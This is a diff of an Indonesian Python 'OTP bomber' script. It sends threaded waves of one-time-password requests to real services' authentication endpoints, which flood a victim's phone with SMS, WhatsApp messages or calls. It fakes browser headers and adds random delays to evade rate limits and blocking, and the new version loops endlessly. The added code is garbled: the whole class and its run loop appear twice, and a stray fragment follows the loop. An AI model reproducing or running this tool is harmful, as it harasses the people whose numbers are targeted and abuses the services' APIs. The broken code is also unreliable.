@@ -2,117 +2,128 @@ import requests
 import threading
 import time
 import random
-import os
-from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-# --- SETTING WARNA (BIAR GAK LAWAK) ---
-G = '\033[32m' # Hijau
-R = '\033[31m' # Merah
-Y = '\033[33m' # Kuning
-W = '\033[37m' # Putih
-C = '\033[36m' # Cyan
-
-class SZN_V6_REBORN:
+class GhostEngine:
     def __init__(self, target):
-        # Auto-format nomor ke standar internasional +62
-        self.target = self.format_target(target)
-        self.num_only = self.target.replace("+62", "0") # Untuk API yang minta 08
+        self.target = target.replace("+62", "0") if target.startswith("+62") else target
         self.success = 0
         self.failed = 0
-        self.lock = threading.Lock()
         
-        # Kumpulan identitas HP High-End (Bypass Detector)
-        self.ua_list = [
-            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.63 Mobile Safari/537.36"
-        ]
+    def get_session(self):
+        """Membuat sesi palsu agar terlihat seperti Browser asli"""
+        session = requests.Session()
+        retry = Retry(connect=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
+        # Identitas Browser yang sangat lengkap
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Connection': 'keep-alive',
+        })
+        return session
 
-    def format_target(self, num):
-        num = num.strip().replace(" ", "").replace("-", "")
-        if num.startswith("08"): return "+62" + num[1:]
-        if num.startswith("8"): return "+62" + num
-        if num.startswith("62"): return "+" + num
-        return num
-
-    def get_headers(self, referer):
-        return {
-            'User-Agent': random.choice(self.ua_list),
-            'Accept': 'application/json, text/plain, */*',
-            'Content-Type': 'application/json',
-            'Origin': referer,
-            'Referer': referer,
-            'X-Requested-With': 'XMLHttpRequest'
-        }
-
-    def fire(self, mode):
-        """Mesin Eksekusi Peluru"""
+    def attack(self, api_name):
+        s = self.get_session()
         try:
-            if mode == "WA":
+            if api_name == "SKILL":
                 url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
-                data = {"phoneNumber": self.num_only}
-                ref = "https://skillacademy.com/"
-            elif mode == "SMS":
+                json_data = {"phoneNumber": self.target}
+            elif api_name == "MATAHARI":
                 url = "https://api.matahari.com/v1/auth/otp"
-                data = {"phone": self.num_only, "type": "register"}
-                ref = "https://www.matahari.com/"
-            elif mode == "CALL":
-                url = "https://api.alodokter.com/v1/auth/otp_call"
-                data = {"phone": self.num_only}
-                ref = "https://www.alodokter.com/"
-
-            # Request dengan Timeout lebih panjang (Anti-Macet)
-            res = requests.post(url, json=data, headers=self.get_headers(ref), timeout=20)
+                json_data = {"phone": self.target, "type": "register"}
             
-            with self.lock:
-                if res.status_code in [200, 201]:
-                    self.success += 1
-                    print(f"{G}[{datetime.now().strftime('%H:%M:%S')}] {mode} => SUCCESS!{W}")
-                else:
-                    self.failed += 1
-                    print(f"{R}[{datetime.now().strftime('%H:%M:%S')}] {mode} => GAGAL ({res.status_code}){W}")
-        except:
-            with self.lock:
+            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
+            time.sleep(random.uniform(0.1, 0.9))
+import requests
+import threading
+import time
+import random
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+class GhostEngine:
+    def __init__(self, target):
+        self.target = target.replace("+62", "0") if target.startswith("+62") else target
+        self.success = 0
+        self.failed = 0
+        
+    def get_session(self):
+        """Membuat sesi palsu agar terlihat seperti Browser asli"""
+        session = requests.Session()
+        retry = Retry(connect=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
+        # Identitas Browser yang sangat lengkap
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Connection': 'keep-alive',
+        })
+        return session
+
+    def attack(self, api_name):
+        s = self.get_session()
+        try:
+            if api_name == "SKILL":
+                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
+                json_data = {"phoneNumber": self.target}
+            elif api_name == "MATAHARI":
+                url = "https://api.matahari.com/v1/auth/otp"
+                json_data = {"phone": self.target, "type": "register"}
+            
+            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
+            time.sleep(random.uniform(0.1, 0.9))
+            
+            res = s.post(url, json=json_data, timeout=15)
+            if res.status_code == 200:
+                self.success += 1
+                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
+            else:
                 self.failed += 1
-                print(f"{Y}[TIMEOUT] Jalur {mode} Sibuk!{W}")
+                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
+        except:
+            self.failed += 1
+            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")
 
-    def storm(self, waves):
-        for i in range(waves):
-            print(f"\n{C}[ GELOMBANG {i+1} ] Menyerang...{W}")
-            ths = []
-            for m in ["WA", "SMS", "CALL"]:
-                t = threading.Thread(target=self.fire, args=(m,))
-                ths.append(t)
-                t.start()
+# --- Eksekusi ---
+target = input("Target (08xxx): ")
+bot = GhostEngine(target)
+while True:
+    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
+    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
+    t1.start()
+    t2.start()
+    # Jeda antar gelombang biar gak kena limit IP
+    time.sleep(12) 
             
-            for t in ths: t.join()
-            
-            # AUTO-DELAY ALGORITHM (SZN-Logic)
-            # Biar gak gampang kena block, jeda acak 4-8 detik
-            wait = random.uniform(4.0, 8.5)
-            print(f"{Y}[SYSTEM] Cooling down {wait:.1f}s...{W}")
-            time.sleep(wait)
+            res = s.post(url, json=json_data, timeout=15)
+            if res.status_code == 200:
+                self.success += 1
+                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
+            else:
+                self.failed += 1
+                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
+        except:
+            self.failed += 1
+            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")
 
-def banner():
-    os.system('clear')
-    print(f"""{C}
-    ╔════════════════════════════════════════╗
-    ║     {R}SZN-ULTIMATE V6 {G}(REBORN EDITION){C}     ║
-    ║   {W}Target: {G}International +62 Protocol   {C}  ║
-    ╚════════════════════════════════════════╝{W}
-    """)
-
-if __name__ == "__main__":
-    banner()
-    target = input(f"{W}Input Nomor (+62/08): ")
-    bot = SZN_V6_REBORN(target)
-    
-    print(f"{G}[!] Target Locked: {bot.target}{W}")
-    waves = int(input(f"{W}Jumlah Gelombang Serangan: "))
-    
-    print(f"\n{R}[!!!] MEMULAI PEMBOMAN...{W}")
-    bot.storm(waves)
-    
-    print(f"\n{C}--- [ LAPORAN SELESAI ] ---")
-    print(f"{G}BERHASIL: {bot.success} | {R}GAGAL: {bot.failed}{W}")
+# --- Eksekusi ---
+target = input("Target (08xxx): ")
+bot = GhostEngine(target)
+while True:
+    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
+    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
+    t1.start()
+    t2.start()
+    # Jeda antar gelombang biar gak kena limit IP
+    time.sleep(12) 
             
